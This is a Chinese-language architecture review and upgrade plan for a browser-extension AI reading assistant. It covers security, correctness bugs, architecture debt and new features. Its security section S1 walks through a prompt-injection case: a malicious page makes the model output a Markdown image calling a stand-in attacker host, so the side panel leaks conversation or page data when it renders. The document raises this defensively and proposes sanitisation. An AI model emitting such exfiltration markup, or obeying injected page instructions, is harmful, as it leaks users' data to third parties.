# 架构评审与升级设计（2026-09-25）

> 范围：`src/`（side panel / options / content / background）、`proxy/`、构建与工具链。
> 基线：`main` @ `6a2c2a5`（PR #1 合并后）。配套实施计划见
> `docs/superpowers/plans/2026-09-25-architecture-upgrade.md`。

---

## 0. 结论速览

| 维度 | 评价 | 一句话 |
|------|------|--------|
| 分层与模块化 | ★★★☆☆ | 6 层结构、事件总线、platform 缝合层方向正确，但只落地了约三成：大量模块仍直连 `chrome.*`，SW 端完全没用 `protocol.ts` |
| 正确性 | ★★★☆☆ | 流式/切 tab/停止等边界已打磨得很细，但仍有若干真实 bug（重试定位、批阅取消、dev 构建） |
| 安全与隐私 | ★★☆☆☆ | **LLM 输出未净化直接 `innerHTML`**、密钥走 `storage.sync`、proxy 监听全网卡 + `CORS *`、所有页面选区都上报 |
| 可扩展性（Agent / 多 Provider） | ★★☆☆☆ | Provider 写死为 OpenAI 兼容 + 字节 TTS；`callAI` 是 250 行闭包，难以接入工具调用 |
| 数据层 | ★★☆☆☆ | page records 已迁 IndexedDB，但聊天记录 / tab 状态仍是整块 JSON blob 写 `chrome.storage`，无配额处理、无 schema 版本 |
| 工程化 | ★★★☆☆ | 1009 个测试、strict TS 很好；但无 CI、ESLint 不检查 `.ts`（分层护栏形同虚设）、`npm run dev` 的 IIFE 监听已失效 |

**最优先处理的 5 件事**：
1. Markdown 渲染加净化（DOMPurify）+ 外链/外部图片策略（S1）
2. 消息引入稳定 `id`，重试/编辑按 id 截断（C1）
3. 修复 `scripts/watch-iife.js` 入口（C3）与批阅取消挂起（C2）
4. 密钥改存 `storage.local`、导出默认脱敏、proxy 仅绑 127.0.0.1 并校验 Origin（S2/S3）
5. 建 CI（tsc + typescript-eslint + vitest + build），把分层规则变成 error（E1）

---

## 1. 现状架构速览

```
┌───────────── Content Script (IIFE, <all_urls>, document_idle) ─────────────┐
│ extract(Readability) · selectionchange→SW · annotation(DOM+shadow) · scroll │
└──────────────┬─────────────────────────────────────────┬──────────────────┘
   runtime.sendMessage (selection, annotation progress)   │ Port 'annotation'
               ▼                                          ▼
┌──────────────────────── Service Worker (IIFE) ───────────────────────────────┐
│ onConnect: if/else 按 port.name 分发 → sw-openai / sw-tts / sw-podcast /     │
│            sw-annotation（各自读 storage.sync、各自 fetch）                   │
│ onMessage: selection 转发广播 / fetchModels / pageRecords:*（IndexedDB）      │
└──────────────┬───────────────────────────────────────────────────────────────┘
               │ 8 个命名 Port + 一次性消息
┌──────────────▼──────────── Side Panel (Vite ESM) ────────────────────────────┐
│ main.ts 手工装配 → state.ts(per-tab Map + storage.session) · events.ts        │
│ ui/ (dom-helpers 465 行, global-events, tab-switch-handler)                   │
│ services/ (message-sender → stream-handler.callAI → marked → innerHTML)      │
│ features/ (chat-history[storage.local] / related-pages / podcast / outline…) │
└──────────────────────────────────────────────────────────────────────────────┘
                     podcast-audio → http://localhost:3456 (proxy/, Node + ws)
```

优点（应保留）：
- **单一发送管线** `submit()` / composer，单一 SSE 管线 `streamChatCompletion()`，单一收尾 `finalize()`——这些"单点收口"是最有价值的资产。
- 后台流（切 tab 不中断）、`CHAT_RERENDERED` 重挂、`restoreTabState` 不恢复 in-flight 标志，边界处理成熟。
- 提示词集中于 `shared/prompts.ts`、Result 类型、平台层、IndexedDB 向量库迁移都是正确方向。

---

## 2. 问题清单

分级：**P0** 安全/数据风险或用户可见 bug，尽快修；**P1** 架构债，阻碍后续功能；**P2** 改善项。

### 2.1 安全与隐私

#### S1 [P0] LLM 输出未经净化直接写入 `innerHTML`
- 位置：`services/stream-handler.ts:164,173`、`ui/dom-helpers.ts:53,347`、`features/chat-history.ts`（历史以 **HTML** 形式存 `displayMessages` 并在旧记录路径回灌 `innerHTML`）。
- `marked` 默认不净化 HTML。页面内容会进入上下文，恶意页面可以做提示注入，让模型输出：
  - `![](https://attacker.tld/c?d=<对话/页面摘要>)` 或 `<img src=…>`：侧边栏加载即外泄数据。MV3 扩展页默认 CSP 只约束 `script-src`/`object-src`，**`img-src` 等资源加载不受限**；
  - `<a href="javascript:…">` 虽被 CSP 拦截执行，但伪造按钮/钓鱼链接、覆盖式 `<div style>` 仍可伪造 UI；
  - 存入 `storage.local` 的 HTML 在"加载历史"时再次注入，形成持久化注入。
- 建议：
  1. 引入 `DOMPurify`（~20KB）封装 `renderMarkdown(text)`，全项目唯一 Markdown→DOM 出口；白名单标签，去掉 `style`/事件属性。
  2. 图片策略：默认把外链图片替换为"点击加载"占位；或在 manifest 显式声明 `content_security_policy.extension_pages` 加 `img-src 'self' data: blob:`。
  3. 链接统一 `target=_blank rel="noopener noreferrer"`，非 http(s) 协议剥离。
  4. 聊天历史只存 Markdown 源（`conversationHistory` 已足够），不再存 HTML 快照。

#### S2 [P0] 密钥存放于 `chrome.storage.sync`，且文案与事实不符
- `apiKey`、`embeddingApiKey`、`ttsAccessKey` 等都写 `storage.sync`，会随 Google 账号同步到所有设备、以明文存于同步服务；而设置页文案 `settings.llm.apiKey.hint` 写着"仅保存在本地浏览器中"。
- 导出设置（`options/import-export.ts`）把所有密钥明文写进 JSON 文件。
- 建议：密钥迁移到 `storage.local`（一次性迁移 + 删除 sync 中旧值）；设置页提供"跨设备同步密钥"显式开关；导出默认脱敏，勾选"包含密钥"才导出；修正文案。

#### S3 [P0] 本地 proxy 监听所有网卡且 `Access-Control-Allow-Origin: *`
- `proxy/server.js`：`server.listen(PORT)` 未指定 host → 绑定 `0.0.0.0/::`，局域网可访问；CORS `*` 使任意网站都能从浏览器向其发请求（开放中继，且请求体中带有用户的火山引擎凭据时会被转发）。
- 建议：`listen(PORT, '127.0.0.1')`；校验 `Origin` 必须为 `chrome-extension://<id>`；可选共享 token（启动时生成、在设置页填写）。

#### S4 [P1] 所有页面的选区都实时上报，且静态注入 `<all_urls>`
- `content/index.ts` 在每个标签页监听 `selectionchange`，300ms 防抖后把选中文本发给 SW，SW 再 `runtime.sendMessage` 广播——**即使侧边栏没打开**。这既是隐私问题（任何选区都会离开页面上下文），也会反复唤醒 SW。
- 静态 `content_scripts: <all_urls>` + `host_permissions: <all_urls>` 会显著增加商店审核阻力；`sendToContentScript()` 已具备按需注入能力。
- 建议：
  1. 侧边栏打开时与 SW 建立 `panel` Port，SW 以"是否有 panel 连接 + 窗口"为条件决定是否转发；或由 panel 直接向当前 tab 的 content script 订阅选区。
  2. 中期改为 `activeTab` + `scripting` 按需注入，`host_permissions` 改为 `optional_host_permissions`，首次使用时申请。

#### S5 [P2] SW 消息处理不校验发送方与载荷
- `service-worker.ts` 所有 handler 直接 `msg as …` 强转；`fetchModels` 接受任意 `apiBase` + `apiKey` 并由 SW 发起请求。content script 也能调用。
- 建议：统一 RPC 层做 `sender.id === chrome.runtime.id` 校验，按调用来源（content / extension page）限制可用方法，载荷用运行时类型守卫校验。

### 2.2 正确性 Bug

#### C1 [P0] 重试/编辑按"内容字符串"定位历史，重复消息时截断错位
- `chat/history-ops.ts:truncateHistoryFromUserContent` 用 `findLastIndex(content === userContent)`；`message-sender.ts:resendUserMessage` 却从被点击的 **DOM 节点** 起删除。
- 复现：连续两次点"总结"（同一 prompt）→ 历史 `[u1, a1, u2, a2]`；点第一条的重试：DOM 删掉 u1 之后全部，历史却只从 u2 截断 → 剩 `[u1, a1]` + 新消息。模型看到本应删除的旧轮次；切 tab 回来后"幽灵消息"重新出现。
- 建议：`ChatMessage` 增加 `id`（`crypto.randomUUID()`），DOM `data-msg-id`，所有重试/编辑/删除按 id 操作。这也是后续"分支对话"的前提。

#### C2 [P1] 批阅"清除"依赖自身 `disconnect()` 触发 `onDisconnect`，Promise 永不 resolve
- `content/annotation/orchestrator.ts:handleClearAnnotation` 注释称"disconnecting fires onDisconnect, which resolves each requestChunk promise"，但 Chrome 中主动调用 `port.disconnect()` 的一端**不会**收到自己的 `onDisconnect`（AGENTS.md "Stop button" 一节正是这个坑）。
- 结果：被清除的 `requestChunk` 永远 pending，`handleStartAnnotation` 的 worker 与闭包泄漏；若日后依赖该 Promise 做收尾逻辑会直接卡死。
- 建议：`requestChunk` 暴露 `cancel()`，清除时显式 `resolve({status:'error', error:'cancelled'})`。

#### C3 [P0-dev] `npm run dev` 的 IIFE 监听入口已不存在
- `scripts/watch-iife.js` 监听 `src/content/index.js`、`src/background/service-worker.js`，两者早已改为 `.ts`；且未挂 esbuild 插件。开发模式下 content/background 实际不会被构建，AGENTS.md 的描述也已过时。
- 建议：抽出 `build-extension.js` 的 `resolveEntry` + 插件配置复用；或直接改用 Vite 多入口 + `build.lib`/`@crxjs/vite-plugin` 统一产物。

#### C4 [P1] 存储配额与写入失败无处理
- `state.ts:writeTabState` 把**未截断的整页正文** + 全量历史写入 `storage.session`（默认 10MB 配额，全部 tab 共享），无 `catch`；多开长文页面会静默失败 / 未处理 rejection。
- `chat-history.ts` 把最多 50 条对话（HTML 快照 + 历史各一份）作为**单个数组**存 `storage.local`，每次保存整读整写；未声明 `unlimitedStorage`，超配额时回调里也不检查 `lastError`。
- 建议：聊天记录迁 IndexedDB（与 page records 同库，新增 `chats`/`messages` store）；`storage.session` 只存轻量索引与指针，正文缓存放 IndexedDB 或内存 LRU；所有写入统一 `try/catch` 并提示。

#### C5 [P1] SSE 解析健壮性
- `sw-openai.ts:streamChatCompletion`：
  - 只识别 `data: `（带空格），规范允许 `data:` 无空格；
  - 流中返回的 `{"error":…}` JSON 被 `catch {}` 吞掉；
  - 未处理 `finish_reason: "length"`（回答被截断时用户无感知）；
  - 无空闲超时：上游挂住时 UI 一直"生成中"，只能手动停止；
  - `usage` 未透传，无法做 token/费用统计。
- 建议：抽出纯函数 `parseSSE()`（可单测）+ `idleTimeout`（如 60s 无数据即报错）+ `StreamMessage` 增加 `{type:'finish', reason, usage}`。

#### C6 [P1] 提示词/多语言规则被绕过
- `sw-annotation.ts:buildAnnotationMessages` 的 user prompt 是硬编码中文，`lang='en'` 时仍发中文指令；
- `features/podcast/script.ts:94` 的播客标题提示词硬编码英文且内联；
- 违反 AGENTS.md "All LLM prompts live in `src/shared/prompts.ts`"。建议全部收口到 `getPrompt()`，加一个测试扫描 `src/**` 中 `role: 'system', content: '…'` 字面量。

#### C7 [P2] 其他零散问题
- `extractPageContent` 直接写 `tabState.pageContent = …`，绕过 state setter（与 "Add new TabState fields as explicit getter/setter pairs" 约定冲突）。
- `setIsPodcastGenerating` 只作用于 active tab，与 `setGeneratingForTab` 语义不对称，后台 tab 的播客状态可能错乱。
- `state.ts` 模块加载即注册 `chrome.tabs` 监听（"Backwards-compat" 分支），与 `initState()` 的延迟注册设计矛盾，测试需额外 mock。
- `genId`/UUID 回退实现复制了 2 份（`sw-annotation`、`sw-podcast`）；`DEFAULT_API_BASE` 在 4 处重复。
- 生产构建 `sourcemap: 'inline'`（Vite 与 Rollup 均是），显著增大 `dist/` 体积。

### 2.3 架构债

#### A1 [P1] 协议层与平台层"定义了但没用上"
- `shared/protocol.ts` 定义了完整的 wire 类型，但 SW 端 `onConnect` 全部是 `Record<string, unknown>` + 强转；8 个 port 里只有 `EMBEDDING` 用了 `PORT_NAMES`。
- side panel 中 `stream-handler`、`suggest-questions`、`podcast/*`、`tts/*`、`annotation orchestrator` 仍直接 `chrome.runtime.connect({ name: '…' })`，`stream-handler.ts` 还在内部**重新声明**了一个 `StreamMessage`。
- side panel / options / content 中仍有约 55 处直接调用 `chrome.runtime.connect`、`chrome.storage.*.get/set`、`storage.onChanged`、`tabs.query/onActivated`，绕过 `platform/`。
- 建议：见 §3.2 的 **类型化 RPC**：`defineChannel<Req, Msg>(name)` 同时生成客户端 `open()` 与 SW 端 `handle()`，SW 用 `Map<PortName, Handler>` 注册表替代 if/else 链。

#### A2 [P1] 配置读取分散、无 schema、无迁移
- `chrome.storage.sync.get(['apiKey','apiBase','modelName'])` 在 SW 多个模块、side panel、options 里各读各的；默认值（DeepSeek base、TTS resourceId、speaker）散落各处；`quickCommands` 在 `local`，其余在 `sync`；已废弃字段靠 options 保存时顺手 `remove`。
- 建议：`shared/settings.ts` 定义 `Settings` schema（字段、默认值、存储区、是否敏感）+ `SETTINGS_VERSION` + 迁移函数表；`getSettings()` / `watchSettings()` 单入口。

#### A3 [P1] 两套发布订阅 + 事件载荷携带 DOM
- `state.subscribe(key: string)`（无类型）与 `events.ts`（有类型）并存；`RETRY`/`EDIT`/`GENERATE_SUGGESTIONS` 的载荷是 `HTMLElement`，导致 service 层依赖 DOM 结构，无法 headless 测试。
- 建议：state 变更事件并入类型化事件总线；事件载荷只传 `messageId`/`tabId` 等数据，DOM 查找留在 UI 层。

#### A4 [P1] `callAI` 是 250 行的"上帝闭包"
- 同一个闭包里混合：Port 传输、流状态、Markdown 渲染节流、思考块 UI、TTS 自动朗读、历史写入、后台 tab 挂起/重挂、建议问题触发。
- 这是 Agent/工具调用（曾实现又被 revert，见 `9694b63`）难以落地的根本原因。
- 建议拆为：
  - `ChatSession`（headless 状态机：`idle → streaming → done|error|aborted`，产出 `thinking/text/toolCall/finish` 事件，持有 `messageId`）；
  - `ChatView`（订阅 session 事件渲染；tab 切换时 detach/attach）；
  - `SessionRegistry`（按 tabId 管理活跃会话，替代 `_activeStreams/_pendingSaves/_pendingErrors` 三个 Map）。

#### A5 [P1] 上下文构建策略过于粗放
- 每轮都发送"整页正文（≤64000 字符，只保留开头）+ 全量历史"；无 token 预算、无历史压缩、无模型上下文长度感知；长文尾部静默丢失。
- 深度批阅每个段落都携带**完整文章**：N 段 × 全文长度，token 成本为 O(N·L)（60 段、3 万字的文章≈180 万字符输入）。
- 建议：`ContextBuilder` 负责预算分配（system / page / history / 当前问题）；长页面分块 + 检索（复用现有 embedding 配置，页内 top-k）；历史超预算时摘要压缩；批阅改为"全文摘要 + 目标段 ± 邻段"或多段合批。

#### A6 [P2] 分层护栏失效
- ESLint 没有 `typescript-eslint`，**不检查任何 `.ts` 文件**——而源码几乎全是 `.ts`，`no-restricted-imports` 实际不生效；
- `ui/global-events.ts` 直接 import `features/*`、`services/*`，形成已知环 `global-events ↔ tab-switch-handler`；
- 建议：引入 `typescript-eslint` + `eslint-plugin-boundaries`（或 `dependency-cruiser`），按 §3.1 的层级把规则设为 error；新建 `side_panel/shell/` 承接 `global-events` 与 `main.ts` 的装配逻辑。

#### A7 [P2] Provider 耦合
- 只支持 OpenAI 兼容 Chat Completions；TTS/播客绑定火山引擎；播客需要用户本地跑 Node 代理，分发体验差。
- 无"按功能选模型"（建议问题、标题生成、批阅本可用便宜模型）。

#### A8 [P2] 工程化
- 无 CI（仓库没有 `.github/workflows`）；1009 个测试不会在 PR 上自动运行。
- `@esbuild-kit/esm-loader` 已废弃；版本号固定 `1.0.0`，无 changelog / 发版流程。
- 覆盖率阈值（lines 55%）偏低，核心 `stream-handler`/`state` 应单独提高阈值。

---

## 3. 目标架构

### 3.1 分层（调整后）

```
shared/        纯数据与纯函数：types, protocol(channels), settings schema, prompts, markdown(sanitize), sse
platform/      chrome.* 唯一出口：rpc(client/server), storage, tabs, scripting, permissions
background/    AI Gateway：providers/*, channels/*(handler 注册表), jobs(批阅/播客/embedding 队列), db
content/       按需注入：extract, selection(仅 panel 打开时), annotation, highlight-anchor
side_panel/
  core/        headless：ConversationStore, ChatSession, ContextBuilder, SessionRegistry（无 DOM）
  ui/          纯渲染组件：MessageView, Composer, Toast…（只依赖 core 的事件与数据）
  features/    功能模块：history, related, podcast, outline, annotation…（依赖 core + ui）
  shell/       装配：main.ts、全局快捷键、tab 生命周期（唯一可以 import 所有层的地方）
```
规则：`core` 禁止 import `ui/features/shell` 与 DOM 类型；`ui` 禁止 import `features/shell`；`features` 之间只能通过事件或 `core` 通信。用 lint 强制。

### 3.2 类型化 RPC（替代 8 个手写 Port 分发）

```ts
// shared/channels.ts
export const chatChannel = defineStream<ChatRequest, StreamMessage>('ai-chat');
export const fetchModels = defineCall<FetchModelsReq, FetchModelsRes>('fetchModels');

// background
registerStream(chatChannel, async (req, emit, signal) => { … });   // 自动 AbortSignal、错误归一
registerCall(fetchModels, async (req, sender) => { … });            // 自动 sender 校验

// side panel
const stream = chatChannel.open(req);   // AsyncIterable<StreamMessage> + abort()
for await (const m of stream) { … }
```
收益：两端共享类型；统一取消语义（解决 C2 这类坑）；统一错误结构 `{code, messageKey, detail}`；SW 侧 `if/else` 链变成注册表；可以统一加日志、耗时、token 统计。

### 3.3 Provider 抽象

```ts
interface LLMProvider {
  id: string;
  chat(req: ChatRequest, signal: AbortSignal): AsyncIterable<ChatDelta>; // text | thinking | tool_call | finish(usage)
  capabilities: { vision: boolean; jsonMode: boolean; tools: boolean; contextWindow: number };
}
interface EmbeddingProvider { embed(texts: string[]): Promise<number[][]> }
interface SpeechProvider { synthesize(text, voice, signal): AsyncIterable<Uint8Array> }
```
- 首批实现：`openai-compatible`（现有逻辑迁入）、`anthropic`、`gemini`、`ollama`（本地）。
- **模型档案（Profiles）**：用户可配置多个 {provider, baseUrl, key, model}，并按功能路由（chat / suggest / annotation / podcast-script / title）。
- `jsonMode` 降级从 `sw-annotation` 的全局变量提升为 provider 能力缓存（按 baseUrl+model 记忆，存 `storage.local`）。

### 3.4 数据层：一个 IndexedDB，多 store

| Store | Key | 内容 | 替代 |
|-------|-----|------|------|
| `chats` | chatId | 标题、pageUrl、pageTitle、时间 | `storage.local.chatHistories` |
| `messages` | [chatId, msgId] | ChatMessage（含 id、parentId 以支持分支） | 历史里的 HTML 快照 |
| `pages` | normalizedUrl | 抽取正文、分块、摘要、抽取时间 | `storage.session` 中的整页正文 |
| `pageRecords` | normalizedUrl | embedding（已存在） | — |
| `annotations` | normalizedUrl | 批阅结果 + 文本锚点 | 目前刷新即丢失 |
| `highlights` | id | 用户高亮/笔记 + TextQuoteSelector | 新功能 |

`storage.session` 只保留 `{tabId → chatId, pageUrl}` 这类轻量指针；`storage.sync` 只保留非敏感偏好。DB 版本升级通过集中 `migrations[]` 执行。

### 3.5 会话模型

- `ChatMessage` 增加 `id`、`parentId`、`createdAt`、`status`（`streaming|done|error|aborted`）、`usage?`。
- 编辑/重试 = 在同一 `parentId` 下新建兄弟节点（**分支**），UI 用 `< 2/3 >` 切换，不再破坏性截断。
- `toApiMessage` 沿当前分支路径线性化。

### 3.6 渲染管线

`renderMarkdown(src, {streaming})` = `balanceFences` → `marked` → `DOMPurify` → 链接/图片策略 → 代码块高亮（按需）。流式阶段可进一步用增量渲染（只重渲最后一个 block），把长回答从 O(n²) 降到近似 O(n)。

---

## 4. 新功能需求

按 **价值 / 成本** 排序；★ 表示依赖 §3 的某项升级。

### F1 引用溯源问答（高价值 · 中成本）★ContextBuilder
- 回答中的每个论断附 `[1][2]` 引用，点击即在页面中**滚动并高亮原文**（复用 `content/annotation/quote-wrapper.ts` 的 `findAndWrap`）。
- 实现：页面分块带编号 → prompt 要求引用块号与原句 → 渲染时把 `[n]` 转为可点按钮 → `sendToContentScript(tab, {action:'highlightQuote', quote})`。
- 价值：解决"AI 是不是在编"的信任问题，是阅读助手的核心差异点。

### F2 长文 / 超长页面问答（高价值 · 中成本）★ContextBuilder
- 超过预算的页面自动分块，问答时页内检索 top-k 块 + 全文摘要；对"总结全文"这类全局任务使用 map-reduce。
- 顺带解决当前 64000 字符截断丢尾部的问题。

### F3 PDF / 视频字幕支持（高价值 · 中成本）
- 当前 Chrome PDF 查看器被判为 `pageUnsupported`。用 `pdf.js` 在扩展页内解析 PDF URL（需对应 host 权限）。
- YouTube / B 站：抓取字幕轨作为 pageContent，支持"按时间戳跳转"的引用（与 F1 同构）。

### F4 多标签页联合问答 / 对比阅读（高价值 · 低成本）
- 在输入框 `@` 选择其他打开的标签页，作为附加上下文；内置快捷动作"对比这几篇的观点分歧"。
- 复用 `ensurePageContent(tabId)`，主要工作在 ContextBuilder 的预算分配。

### F5 个人阅读知识库（高价值 · 中成本）★数据层
- 把"知识关联"从"推荐相似页"升级为**可搜索的阅读记忆**：侧边栏"我读过的"语义搜索（"上周看过的那篇讲 RAG 评测的文章"），支持对整个知识库提问（跨页 RAG）。
- 批阅结果、用户高亮、对话摘要一起入库；支持导出 Markdown / Obsidian / Notion。

### F6 持久化高亮与笔记（中高价值 · 中成本）★数据层
- 用户在页面中划线 → 保存 `TextQuoteSelector`（前后文锚定），再次访问自动还原；批阅结果同样按 URL 缓存，避免重复花费 token。
- 与 F5 打通，笔记可一键"问 AI"。

### F7 沉浸式双语对照翻译（中高价值 · 中成本）
- 目前"翻译"只在侧边栏输出整段译文。改为在原文每段下方插入译文（shadow DOM 隔离样式），复用批阅的 chunk-collector + 并发池 + 缓存。

### F8 右键菜单与快捷键（中价值 · 低成本）
- `contextMenus`：选中文字 →"解释 / 翻译 / 追问"，直接打开侧边栏并带引用发送；
- `commands`：`Alt+S` 打开侧边栏、`Alt+Q` 引用当前选区提问。

### F9 模型档案与用量面板（中价值 · 中成本）★Provider 抽象
- 多套 Provider 配置 + 按功能路由（见 §3.3）；
- 透传 `usage`，在侧边栏展示本轮 token / 预估费用，设置页展示按日统计。

### F10 分支对话（中价值 · 低成本）★会话模型
- 编辑/重试不再丢弃后续内容，保留为分支，`< 1/3 >` 切换比较不同回答。

### F11 Agent 模式（中价值 · 高成本）★RPC + ChatSession + Provider
- 之前一次性迁移到 Vercel AI SDK 后被 revert（`9694b63`）。建议**渐进式**：先在自有 `ChatSession` 上支持单轮 tool call，工具集限定在页面内：`read_page_section`、`search_page`、`get_selection`、`screenshot`、`find_related_pages`、`highlight_in_page`，全部只读；再考虑多步循环与"打开链接并阅读"。

### F12 学习模式（中价值 · 低成本）
- 基于当前文章生成测验题 / 闪卡，支持导出 Anki（CSV）；复用 outline 的 JSON 模式生成链路。

### F13 播客去代理化（中价值 · 调研）
- 当前必须本地运行 Node 代理（浏览器 WebSocket 无法设置自定义握手头）。调研火山引擎是否支持 URL 参数鉴权或 HTTP 流式接口；否则提供一键 Docker 镜像 / 托管方案，并在设置页检测 `/health` 给出引导。

---

## 5. 风险与取舍

- **DOMPurify 与流式渲染性能**：净化在 80ms 节流窗口内执行，长回答需配合增量渲染（§3.6），否则 CPU 占用上升。
- **按需注入 vs 选区实时预览**：去掉 `<all_urls>` 静态注入后，未注入过的 tab 首次选区不会自动出现在引用预览条，需要 panel 打开时主动注入当前 tab。
- **IndexedDB 迁移**：需兼容旧 `chatHistories` 与 `tabState_*`，迁移失败必须可回退（保留旧 key 直到新库校验通过）。
- **RPC 重写面广**：分通道逐个迁移，旧 if/else 与新注册表并存一段时间，每迁移一个通道就删除对应旧分支。
